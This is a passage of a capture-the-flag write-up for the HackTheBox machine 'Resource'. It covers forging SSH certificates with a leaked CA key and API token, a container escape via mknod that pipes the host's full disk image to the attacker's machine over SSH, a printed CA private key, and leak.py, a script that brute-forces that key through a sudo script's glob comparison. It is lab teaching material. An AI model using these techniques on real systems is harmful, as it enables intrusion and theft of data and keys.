fi

public_key=$(cat $public_key_file)

curl -s signserv.ssg.htb/v1/sign -d '{"pubkey": "'"$public_key"'", "username": "'"$username"'", "principals": "'"$principal"'"}' -H "Content-Type: application/json" -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"
```

We modified the script and added `zzinter_temp` to the `supported_principals` list.

```c
#!/bin/bash

usage () {
    echo "Usage: $0 <public_key_file> <username> <principal>"
    exit 1
}

if [ "$#" -ne 3 ]; then
    usage
fi

public_key_file="$1"
username="$2"
principal_str="$3"

supported_principals="webserver,analytics,support,security,zzinter_temp"
IFS=',' read -ra principal <<< "$principal_str"
for word in "${principal[@]}"; do
    if ! echo "$supported_principals" | grep -qw "$word"; then
        echo "Error: '$word' is not a supported principal."
        echo "Choose from:"
        echo "    webserver - external web servers - webadmin user"
        echo "    analytics - analytics team databases - analytics user"
        echo "    zzinter - IT support server - zzinter user"
        echo "    security - SOC servers - support user"
        echo
        usage
    fi
done

if [ ! -f "$public_key_file" ]; then
    echo "Error: Public key file '$public_key_file' not found."
    usage
fi

public_key=$(cat $public_key_file)

curl -s signserv.ssg.htb/v1/sign -d '{"pubkey": "'"$public_key"'", "username": "'"$username"'", "principals": "'"$principal"'"}' -H "Content-Type: application/json" -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"
```

Since we could't edit the `original file` because of `missing permissions` to do so, we saved it as `principals.sh`.

```c
zzinter@itrc:~$ ls -la
total 64
drwx------ 1 zzinter zzinter 4096 Aug  4 14:32 .
drwxr-xr-x 1 root    root    4096 Jul 23 14:22 ..
lrwxrwxrwx 1 root    root       9 Jul 23 14:22 .bash_history -> /dev/null
-rw-r--r-- 1 zzinter zzinter  220 Mar 29 19:40 .bash_logout
-rw-r--r-- 1 zzinter zzinter 3526 Mar 29 19:40 .bashrc
-rw------- 1 zzinter zzinter  119 Aug  4 13:36 .mysql_history
-rw-r--r-- 1 zzinter zzinter  807 Mar 29 19:40 .profile
-rw------- 1 zzinter zzinter 5179 Aug  4 14:31 .viminfo
-rw------- 1 zzinter zzinter 2602 Aug  4 08:28 foobar
-rw-r--r-- 1 zzinter zzinter 1115 Aug  4 08:29 foobar.cert
-rw-r--r-- 1 zzinter zzinter  566 Aug  4 08:28 foobar.pub
-rwxr-xr-x 1 zzinter zzinter 1206 Aug  4 14:31 principals.sh
-rw-rw-r-- 1 root    root    1193 Feb 19 16:43 sign_key_api.sh
-rw-r----- 1 root    zzinter   33 Aug  3 19:02 user.txt
```

Then we repeated the `signing steps` from before since the script utilized the `decommissioned_old_ca` but this time we pointed it to `zzinter_temp`.

```c
zzinter@itrc:~$ /bin/bash principals.sh foobar.pub zzinter zzinter_temp > zzinter_temp.cert
```

```c
zzinter@itrc:~$ ls -la
total 64
drwx------ 1 zzinter zzinter 4096 Aug  4 14:32 .
drwxr-xr-x 1 root    root    4096 Jul 23 14:22 ..
lrwxrwxrwx 1 root    root       9 Jul 23 14:22 .bash_history -> /dev/null
-rw-r--r-- 1 zzinter zzinter  220 Mar 29 19:40 .bash_logout
-rw-r--r-- 1 zzinter zzinter 3526 Mar 29 19:40 .bashrc
-rw------- 1 zzinter zzinter  119 Aug  4 13:36 .mysql_history
-rw-r--r-- 1 zzinter zzinter  807 Mar 29 19:40 .profile
-rw------- 1 zzinter zzinter 5179 Aug  4 14:31 .viminfo
-rw------- 1 zzinter zzinter 2602 Aug  4 08:28 foobar
-rw-r--r-- 1 zzinter zzinter 1115 Aug  4 08:29 foobar.cert
-rw-r--r-- 1 zzinter zzinter  566 Aug  4 08:28 foobar.pub
-rwxr-xr-x 1 zzinter zzinter 1206 Aug  4 14:31 principals.sh
-rw-rw-r-- 1 root    root    1193 Feb 19 16:43 sign_key_api.sh
-rw-r----- 1 root    zzinter   33 Aug  3 19:02 user.txt
-rw-r--r-- 1 zzinter zzinter 1119 Aug  4 14:31 zzinter_temp.cert
```

We downloaded the newly created `"certificate"` to login as `zzinter` from our local machine on port `2222/TCP` on the `main host`.

```c
zzinter@itrc:~$ cat zzinter_temp.cert 
ssh-rsa-cert-v01@openssh.com AAAAHHNzaC1yc2EtY2VydC12MDFAb3BlbnNzaC5jb20AAAAg8EBL8oRfCNzPt1f0XeR5Oat5L/P7fhvz3RcyhHCNFvIAAAADAQABAAABgQDOnDqhA2ly5fZjHdvuO8cvXzM2sQpbw6OBHZyS8BtCr5e3ckMk0RTb3CpnLw6eS3XyCW1qeSlnUG/+dgz16VgcWWm4gQOIwWTpFDvHSA2OKYTzGTzzfRR/Fi4iddeOJL5CooL5nQefvstQCpHU24108JFSMEYNalL/I1B9uqVb7vARYcrxx8ceyFW3ajk29BvJDbMhaM2V9GUCw1K36tmemM2FrCNs9Vd8lUVNBzdC2ZBv9S0xrlQKozr4Q+cPF/4ePBSEriUGn9/+FRXzkjr3RSNwPSJBO7G0bXXSnEd5Wac1ahm+FQNiDTbbsm+CgCc8Cwqzi36f/rvPxmlCA3lCSCvsVRa3NEpEK+a8tKRsT4bynmoa+oHDRxMLKr8KE72fewRk7lCFxoNX8VutGobE+E25HddAfAlw0atLS5Bu8qLk02SGiGREscs4JYO/cKPQEbmVvZ+1Dsh1gjZBySstF7hu3nHwsLS8CQdtZoqPVb2suHbKNS6j1cVy3ehnVxMAAAAAAAAAKAAAAAEAAAAHenppbnRlcgAAABAAAAAMenppbnRlcl90ZW1wAAAAAGamVkn//////////wAAAAAAAACCAAAAFXBlcm1pdC1YMTEtZm9yd2FyZGluZwAAAAAAAAAXcGVybWl0LWFnZW50LWZvcndhcmRpbmcAAAAAAAAAFnBlcm1pdC1wb3J0LWZvcndhcmRpbmcAAAAAAAAACnBlcm1pdC1wdHkAAAAAAAAADnBlcm1pdC11c2VyLXJjAAAAAAAAAAAAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIIHg8Cudy1ShyYfqzC3ANlgAcW7Q4MoZuezAE8mNFSmxAAAAUwAAAAtzc2gtZWQyNTUxOQAAAEAZkEI9YC4qwZxMznCYNwOflt9ri9s4UyRumrOQImYHkaHm1isTiCf+91xkuc5oABACrCH6/Zcvl2Fcf2+sbN8E zzinter@itrc
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Resource/files]
└─$ ssh -p 2222 -i foobar -o CertificateFile=zzinter_temp.cert zzinter@10.129.251.225 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-117-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Aug  4 02:35:35 PM UTC 2024

  System load:           0.01
  Usage of /:            79.2% of 10.73GB
  Memory usage:          34%
  Swap usage:            0%
  Processes:             259
  Users logged in:       1
  IPv4 address for eth0: 10.129.251.225
  IPv6 address for eth0: dead:beef::250:56ff:fe94:d0b2


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Jul 25 12:49:12 2024 from 10.10.14.23
zzinter@ssg:~$
```

## zzinter User Pivoting (Host)

Since we finally escalated our privileges to `zzinter` on the main host we checked his privileges to see how we could proceed to `root`.

```c
zzinter@ssg:~$ id
uid=1001(zzinter) gid=1001(zzinter) groups=1001(zzinter)
```

The user was able to execute a script `sign_key.sh` located in `/opt` with `root privileges`.

```c
zzinter@ssg:~$ sudo -l
Matching Defaults entries for zzinter on ssg:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User zzinter may run the following commands on ssg:
    (root) NOPASSWD: /opt/sign_key.sh
```

```c
zzinter@ssg:~$ cat /opt/sign_key.sh 
#!/bin/bash

usage () {
    echo "Usage: $0 <ca_file> <public_key_file> <username> <principal> <serial>"
    exit 1
}

if [ "$#" -ne 5 ]; then
    usage
fi

ca_file="$1"
public_key_file="$2"
username="$3"
principal="$4"
serial="$5"

if [ ! -f "$ca_file" ]; then
    echo "Error: CA file '$ca_file' not found."
    usage
fi

if [[ $ca == "/etc/ssh/ca-it" ]]; then
    echo "Error: Use API for signing with this CA."
    usage
fi

itca=$(cat /etc/ssh/ca-it)
ca=$(cat "$ca_file")
if [[ $itca == $ca ]]; then
    echo "Error: Use API for signing with this CA."
    usage
fi

if [ ! -f "$public_key_file" ]; then
    echo "Error: Public key file '$public_key_file' not found."
    usage
fi

supported_principals="webserver,analytics,support,security"
IFS=',' read -ra principal <<< "$principal_str"
for word in "${principal[@]}"; do
    if ! echo "$supported_principals" | grep -qw "$word"; then
        echo "Error: '$word' is not a supported principal."
        echo "Choose from:"
        echo "    webserver - external web servers - webadmin user"
        echo "    analytics - analytics team databases - analytics user"
        echo "    support - IT support server - support user"
        echo "    security - SOC servers - support user"
        echo
        usage
    fi
done

if ! [[ $serial =~ ^[0-9]+$ ]]; then
    echo "Error: '$serial' is not a number."
    usage
fi

ssh-keygen -s "$ca_file" -z "$serial" -I "$username" -V -1w:forever -n "$principals" "$public_key_name"
```

## Unintended Solution

### Abusing Docker Container for Remote Disk Image Dumping

At this point we were pretty lost on the box so we started to look for alternative and unintended solutions. This was the moment `ar0x4` came up with an `IQ500` move and how we could `escalate our privileges` to `root` inside the `container`.

We needed to "just" sign a key for `root` instead of a `low privileged user`. Second facepalm moment.

```c
msainristil@itrc:~$ ssh-keygen -f root_key -C "root key" -N ""
Generating public/private rsa key pair.
Your identification has been saved in root_key
Your public key has been saved in root_key.pub
The key fingerprint is:
SHA256:brfEh5D8O8MzKCsEDNUYOrzt/+NX5SRP0JaYqICaBbQ root key
The key's randomart image is:
+---[RSA 3072]----+
|.+++.     . + .  |
|o.oo..   . + +   |
|oE+   . .   o    |
| +=    o . . +   |
| . o    S   B    |
|  . .  . + o o   |
|   o    ooB .    |
|    o .o.+*+     |
|     o+=o o=     |
+----[SHA256]-----+
```

```c
msainristil@itrc:~$ ssh-keygen -s decommission_old_ca/ca-itrc -I root -n root -V +52w root_key.pub
Signed user key root_key-cert.pub: id "root" serial 0 for root valid from 2024-08-04T18:10:00 to 2025-08-03T18:11:47
```

```c
msainristil@itrc:~$ ssh -i root_key -o CertificateFile=root_key-cert.pub root@localhost
Linux itrc 5.15.0-117-generic #127-Ubuntu SMP Fri Jul 5 20:13:28 UTC 2024 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 25 12:49:07 2024 from 10.10.14.23
root@itrc:~#
```

We reran `deepce` and found that we had the privilege for `CAP_MKNOD` set. This made us capable of creating a `data blob` through which we could `read files` on the `host`.

First we created the `data blob` as `root` then switched to `zzinter` and executed `/bin/sh` to create a process we could search for.

```c
root@itrc:/# mknod sda b 8 0
root@itrc:/# chmod 777 sda
root@itrc:/# su zzinter
zzinter@itrc:/root$ /bin/sh
$
```

```c
zzinter@ssg:~$ ps aux | grep /bin/sh
zzinter     2434  0.0  0.0   2576   932 ?        S+   19:58   0:00 /bin/sh
zzinter     2438  0.0  0.0   6480  2164 pts/1    S+   19:59   0:00 grep --color=auto /bin/sh
```

After we identified the matching `PID` on the `host` we switched to it on a second session as `zzinter` on the `host` itself.

```c
zzinter@ssg:~$ cd /proc/2434/root
zzinter@ssg:/proc/2434/root$
```

The plan was to `remote dump` the whole image of the box and then mount it locally. Therefore we fired up a quick `SSH config` on our local machine and started `SSH`.

Note: we set the `default port` of `SSH` to a `high port` since we faced connection problems on our first attempt.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Resource/files]
└─$ cat /etc/ssh/sshd_config 

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/local/bin:/usr/bin:/bin:/usr/games

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

Include /etc/ssh/sshd_config.d/*.conf

Port 2266
#AddressFamily any
ListenAddress 0.0.0.0
#ListenAddress ::

#HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key

# Ciphers and keying
#RekeyLimit default none

# Logging
#SyslogFacility AUTH
#LogLevel INFO

# Authentication:

#LoginGraceTime 2m
#PermitRootLogin prohibit-password
#StrictModes yes
#MaxAuthTries 6
#MaxSessions 10

PubkeyAuthentication yes

# Expect .ssh/authorized_keys2 to be disregarded by default in future.
AuthorizedKeysFile      .ssh/authorized_keys .ssh/authorized_keys2

#AuthorizedPrincipalsFile none

#AuthorizedKeysCommand none
#AuthorizedKeysCommandUser nobody

# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts
#HostbasedAuthentication no
# Change to yes if you don't trust ~/.ssh/known_hosts for
# HostbasedAuthentication
#IgnoreUserKnownHosts no
# Don't read the user's ~/.rhosts and ~/.shosts files
#IgnoreRhosts yes

# To disable tunneled clear text passwords, change to no here!
#PasswordAuthentication yes
#PermitEmptyPasswords no

# Change to yes to enable challenge-response passwords (beware issues with
# some PAM modules and threads)
KbdInteractiveAuthentication no

# Kerberos options
#KerberosAuthentication no
#KerberosOrLocalPasswd yes
#KerberosTicketCleanup yes
#KerberosGetAFSToken no

# GSSAPI options
#GSSAPIAuthentication no
#GSSAPICleanupCredentials yes
#GSSAPIStrictAcceptorCheck yes
#GSSAPIKeyExchange no

# Set this to 'yes' to enable PAM authentication, account processing,
# and session processing. If this is enabled, PAM authentication will
# be allowed through the KbdInteractiveAuthentication and
# PasswordAuthentication.  Depending on your PAM configuration,
# PAM authentication via KbdInteractiveAuthentication may bypass
# the setting of "PermitRootLogin prohibit-password".
# If you just want the PAM account and session checks to run without
# PAM authentication, then enable this but set PasswordAuthentication
# and KbdInteractiveAuthentication to 'no'.
UsePAM yes

#AllowAgentForwarding yes
#AllowTcpForwarding yes
#GatewayPorts no
X11Forwarding yes
#X11DisplayOffset 10
#X11UseLocalhost yes
#PermitTTY yes
PrintMotd no
#PrintLastLog yes
#TCPKeepAlive yes
#PermitUserEnvironment no
#Compression delayed
#ClientAliveInterval 0
#ClientAliveCountMax 3
#UseDNS no
#PidFile /run/sshd.pid
#MaxStartups 10:30:100
#PermitTunnel no
#ChrootDirectory none
#VersionAddendum none

# no default banner path
#Banner none

# Allow client to pass locale environment variables
AcceptEnv LANG LC_*

# override default of no subsystems
Subsystem       sftp    /usr/lib/openssh/sftp-server

# Example of overriding settings on a per-user basis
#Match User anoncvs
#       X11Forwarding no
#       AllowTcpForwarding no
#       PermitTTY no
#       ForceCommand cvs server
```

```c
┌──(kali㉿kali)-[~]
└─$ sudo systemctl start ssh
```

Then we started the process of `creating` and `remote dumping` a `disk image` of the box to our instance of `Kali`.

```c
zzinter@ssg:/proc/2708/root$ dd if=/proc/2708/root/sda bs=512 | gzip -1 - | ssh kali@10.10.14.53 -p 2266 'dd of=/home/kali/image.gz'
kali@10.10.14.53's password:
```

After the `disk image` had been created we installed some necessary tools and mounted the image.

```c
┌──(kali㉿kali)-[~]
└─$ sudo apt-get install lvm2
[sudo] password for kali: 
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
lvm2 is already the newest version (2.03.22-1+b1).
0 upgraded, 0 newly installed, 0 to remove and 1 not upgraded.
```

```c
zzinter@ssg:/proc/2708/root$ dd if=/proc/2708/root/sda bs=512 | gzip -1 - | ssh kali@10.10.14.53 -p 2266 'dd of=/home/kali/image.gz'
kali@10.10.14.53's password: 
27262976+0 records in
27262976+0 records out
13958643712 bytes (14 GB, 13 GiB) copied, 14456.2 s, 966 kB/s
7264176+1 records in
7264176+1 records out
3719258445 bytes (3.7 GB, 3.5 GiB) copied, 14452.9 s, 257 kB/s
```

```c
┌──(kali㉿kali)-[~]
└─$ gunzip image.gz
```

```c
┌──(kali㉿kali)-[~]
└─$ sudo apt-get install kpartx
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following NEW packages will be installed:
  kpartx
0 upgraded, 1 newly installed, 0 to remove and 1 not upgraded.
Need to get 28.9 kB of archives.
After this operation, 78.8 kB of additional disk space will be used.
Get:1 http://mirror.netcologne.de/kali kali-rolling/main amd64 kpartx amd64 0.9.9-1 [28.9 kB]
Fetched 28.9 kB in 0s (82.1 kB/s)
Selecting previously unselected package kpartx.
(Reading database ... 429489 files and directories currently installed.)
Preparing to unpack .../kpartx_0.9.9-1_amd64.deb ...
Unpacking kpartx (0.9.9-1) ...
Setting up kpartx (0.9.9-1) ...
Processing triggers for man-db (2.12.1-2) ...
Processing triggers for kali-menu (2024.3.1) ...
Scanning processes...                                                                                                                                                                                                                       
Scanning linux images...                                                                                                                                                                                                                    

Running kernel seems to be up-to-date.

No services need to be restarted.

No containers need to be restarted.

No user sessions are running outdated binaries.

No VM guests are running outdated hypervisor (qemu) binaries on this host.
```

```c
┌──(kali㉿kali)-[~]
└─$ sudo mkdir /mnt/resource
```

```c
┌──(kali㉿kali)-[~]
└─$ sudo mount -t ext4 image /mnt/resource 
mount: /mnt/resource: wrong fs type, bad option, bad superblock on /dev/loop0, missing codepage or helper program, or other error.
       dmesg(1) may have more information after failed mount system call.
```

```c
┌──(kali㉿kali)-[~]
└─$ sudo kpartx -av /dev/loop0
add map loop0p1 (254:3): 0 2048 linear 7:0 2048
add map loop0p2 (254:4): 0 524288 linear 7:0 4096
add map loop0p3 (254:5): 0 26732544 linear 7:0 528384
```

```c
┌──(kali㉿kali)-[~]
└─$ sudo vgscan
  WARNING: Not using device /dev/loop0p3 for PV VuGlYW-FsyN-2joz-Big1-TqvE-h6GE-fyN9Cf.
  WARNING: PV VuGlYW-FsyN-2joz-Big1-TqvE-h6GE-fyN9Cf prefers device /dev/mapper/loop0p3 because device is used by LV.
  Found volume group "ubuntu-vg" using metadata type lvm2
  Found volume group "kali-vg" using metadata type lvm2
```

```c
┌──(kali㉿kali)-[~]
└─$ sudo vgchange -ay
  WARNING: Not using device /dev/loop0p3 for PV VuGlYW-FsyN-2joz-Big1-TqvE-h6GE-fyN9Cf.
  WARNING: PV VuGlYW-FsyN-2joz-Big1-TqvE-h6GE-fyN9Cf prefers device /dev/mapper/loop0p3 because device is used by LV.
  Cannot activate LVs in VG ubuntu-vg while PVs appear on duplicate devices.
  Cannot activate LVs in VG ubuntu-vg while PVs appear on duplicate devices.
  2 logical volume(s) in volume group "ubuntu-vg" now active
  2 logical volume(s) in volume group "kali-vg" now active
```

```c
┌──(kali㉿kali)-[~]
└─$ sudo lvdisplay
  WARNING: Not using device /dev/loop0p3 for PV VuGlYW-FsyN-2joz-Big1-TqvE-h6GE-fyN9Cf.
  WARNING: PV VuGlYW-FsyN-2joz-Big1-TqvE-h6GE-fyN9Cf prefers device /dev/mapper/loop0p3 because device is used by LV.
  --- Logical volume ---
  LV Path                /dev/ubuntu-vg/ubuntu-lv
  LV Name                ubuntu-lv
  VG Name                ubuntu-vg
  LV UUID                5Iu1be-2RuE-u62c-OQhN-Uk4G-irKa-8R60HH
  LV Write Access        read/write
  LV Creation host, time ubuntu-server, 2024-02-07 20:32:40 +0100
  LV Status              available
  # open                 0
  LV Size                11.00 GiB
  Current LE             2816
  Segments               1
  Allocation             inherit
  Read ahead sectors     auto
  - currently set to     256
  Block device           254:6
   
  --- Logical volume ---
  LV Path                /dev/ubuntu-vg/swap
  LV Name                swap
  VG Name                ubuntu-vg
  LV UUID                432odc-Xkxe-d4k5-gVNf-y6M2-jbsJ-9lNpHS
  LV Write Access        read/write
  LV Creation host, time debian, 2024-07-24 15:37:52 +0200
  LV Status              available
  # open                 0
  LV Size                <1.70 GiB
  Current LE             435
  Segments               1
  Allocation             inherit
  Read ahead sectors     auto
  - currently set to     256
  Block device           254:7
   
  --- Logical volume ---
  LV Path                /dev/kali-vg/root
  LV Name                root
  VG Name                kali-vg
  LV UUID                I6A5LE-0sIV-fCWq-hsX7-zUYd-Zw4y-9gDP4G
  LV Write Access        read/write
  LV Creation host, time kali, 2024-07-26 22:18:02 +0200
  LV Status              available
  # open                 1
  LV Size                <98.51 GiB
  Current LE             25218
  Segments               1
  Allocation             inherit
  Read ahead sectors     auto
  - currently set to     256
  Block device           254:1
   
  --- Logical volume ---
  LV Path                /dev/kali-vg/swap_1
  LV Name                swap_1
  VG Name                kali-vg
  LV UUID                MgZpd3-RnO3-0Ngi-bpe5-HUtQ-myYP-EdEqJP
  LV Write Access        read/write
  LV Creation host, time kali, 2024-07-26 22:18:02 +0200
  LV Status              available
  # open                 2
  LV Size                976.00 MiB
  Current LE             244
  Segments               1
  Allocation             inherit
  Read ahead sectors     auto
  - currently set to     256
  Block device           254:2
```

```c
┌──(kali㉿kali)-[~]
└─$ lsblk
NAME                      MAJ:MIN RM  SIZE RO TYPE  MOUNTPOINTS
loop0                       7:0    0   13G  0 loop  
├─loop0p1                 254:3    0    1M  0 part  
├─loop0p2                 254:4    0  256M  0 part  
├─loop0p3                 254:5    0 12.7G  0 part  
│ ├─ubuntu--vg-ubuntu--lv 254:6    0   11G  0 lvm   
│ └─ubuntu--vg-swap       254:7    0  1.7G  0 lvm
<--- CUT FOR BREVITY --->
```

```c
┌──(kali㉿kali)-[~]
└─$ sudo mount /dev/mapper/ubuntu--vg-ubuntu--lv /mnt/resource
```

```c
┌──(kali㉿kali)-[~]
└─$ ls -la /mnt/resource 
total 88
drwxr-xr-x  19 root root  4096 Jul 24 13:54 .
drwxr-xr-x   3 root root  4096 Aug  5 07:06 ..
lrwxrwxrwx   1 root root     7 Aug 10  2023 bin -> usr/bin
drwxr-xr-x   2 root root  4096 Feb  7 20:32 boot
drwxr-xr-x   4 root root  4096 Aug 10  2023 dev
drwxr-xr-x 100 root root  4096 Jul 30 10:45 etc
drwxr-xr-x   4 root root  4096 Jul 23 15:44 home
lrwxrwxrwx   1 root root     7 Aug 10  2023 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Aug 10  2023 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Aug 10  2023 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Aug 10  2023 libx32 -> usr/libx32
drwx------   2 root root 16384 Feb  7 20:32 lost+found
drwxr-xr-x   2 root root  4096 Aug 10  2023 media
drwxr-xr-x   2 root root  4096 Aug 10  2023 mnt
drwxr-xr-x   3 root root  4096 Jul 23 16:03 opt
drwxr-xr-x   2 root root  4096 Apr 18  2022 proc
drwx------   6 root root  4096 Aug  4 21:03 root
drwxr-xr-x  14 root root  4096 Aug 10  2023 run
lrwxrwxrwx   1 root root     8 Aug 10  2023 sbin -> usr/sbin
drwxr-xr-x   8 root root  4096 Feb  7 20:37 snap
drwxr-xr-x   2 root root  4096 Aug 10  2023 srv
drwxr-xr-x   2 root root  4096 Apr 18  2022 sys
drwxrwxrwt  14 root root  4096 Aug  5 00:26 tmp
drwxr-xr-x  14 root root  4096 Aug 10  2023 usr
drwxr-xr-x  14 root root  4096 Feb  8 13:57 var
```

To access the `file system` of the mounted `disk` we needed to switch to `root` but then we were able to read the `root.txt`!

```c
┌──(kali㉿kali)-[/mnt/resource]
└─$ sudo su
┌──(root㉿kali)-[/mnt/resource]
└─#
```

```c
┌──(root㉿kali)-[/mnt/resource]
└─# cd root
```

## root.txt

```c
┌──(root㉿kali)-[/mnt/resource/root]
└─# cat root.txt
62d6eb581685b5e0b524eb06b94e3059
```

## Post Exploitation

Since we were pretty sure that the way we did the box was unintended because we completely ignored the `script` which we could execute with `root privileges`, we read the `ca-it` file afterwards inside our locally mounted `disk image` and there it is.

```c
┌──(root㉿kali)-[/mnt/resource/etc/ssh]
└─# cat ca-it   
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQAAAKg7BlysOwZc
rAAAAAtzc2gtZWQyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQ
AAAEBexnpzDJyYdz+91UG3dVfjT/scyWdzgaXlgx75RjYOo4Hg8Cudy1ShyYfqzC3ANlgA
cW7Q4MoZuezAE8mNFSmxAAAAIkdsb2JhbCBTU0cgU1NIIENlcnRmaWNpYXRlIGZyb20gSV
QBAgM=
-----END OPENSSH PRIVATE KEY-----
```

## Intended Solution

Another huge shout-out to `ar0x4` for the solution! The intended solution was to leak the file mentioned below by using the `script` executed with `sudo`.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Resource/serve]
└─$ cat leak.py 
import subprocess
import string

def bruteforce_ssh_key(content):
    with open("brute_file", "w") as file:
        file.write(content + "*")
    result = subprocess.run(["./sign_key.sh", "brute_file", "../ssh/among.pub", "test", "test", "12345678"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if "Use API for signing with this CA" in result.stdout.decode("utf-8"):
        return True
    return False

chars = string.ascii_letters + string.digits + string.punctuation
ssh_key_content = "-----BEGIN OPENSSH PRIVATE KEY-----"

while True:
    wordlist = string.ascii_letters + string.digits + string.punctuation + " " + "\n"
    for i in wordlist:
        if bruteforce_ssh_key(ssh_key_content + i) and i == "-":
            ssh_key_content += "-----END OPENSSH PRIVATE KEY-----"
            print("\033c", end="")
            print(ssh_key_content)
            exit(0)
        if bruteforce_ssh_key(ssh_key_content + i) and (i != "*" and i != "?"):
            ssh_key_content += i
            print("\033c", end="")
            print(ssh_key_content)
```
